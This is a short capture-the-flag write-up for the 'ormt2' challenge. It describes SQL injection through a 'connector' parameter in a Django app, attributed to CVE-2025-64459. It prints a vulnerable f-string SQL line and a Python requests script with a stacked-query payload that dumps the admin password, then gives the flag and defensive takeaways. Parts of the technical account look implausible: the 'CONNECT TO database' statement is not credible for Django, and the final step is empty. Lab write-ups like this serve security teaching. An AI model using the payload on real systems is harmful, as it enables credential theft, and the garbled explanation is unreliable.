# ORMT - ormt2 (416 pts - Offensive Security)

## Challenge Description

> The bookstore upgraded. The previous injection path was patched.
> `http://exp.cybergame.sk:7002`

## TL;DR

CVE-2025-64459 — a custom Django database connector interpolated user-controlled parameters directly into the SQL CONNECT statement, bypassing all ORM-level sanitization.

## Initial Analysis

The application used a third-party database connector. The ORM traversal from ormt was patched, but the connector's `connect()` call embedded a user-supplied `connector` parameter into raw SQL before any Django escaping could run.

## Solution

### Step 1: Identify the connector injection point

The `connector` GET parameter fed directly into:

```python
sql = f"CONNECT TO database USING connector='{user_input}'"
cursor.execute(sql)
```

### Step 2: Inject SQL to dump admin credentials

```python
import requests

payload = "'; SELECT password FROM auth_user WHERE username='admin'--"
r = requests.get(
    "http://exp.cybergame.sk:7002/book_lookup",
    params={"connector": payload}
)
print(r.text)
```

### Step 3: Login with extracted credentials to get the flag

## Flag

```
SK-CERT{cve_2025_64459_c0nn3ct0r_1nj3ct10n}
```

## Key Takeaways

- **Database connector/adapter code is a SQL injection blind spot** — ORM protections don't apply at the connection layer
- CVE-2025-64459 shows third-party Django connectors can introduce injection points that bypass Django's own sanitization entirely
- Always audit custom DB connectors for raw string interpolation in `connect()` or `cursor.execute()` calls

## Tools Used

- Python `requests` — payload delivery
- Burp Suite — request interception
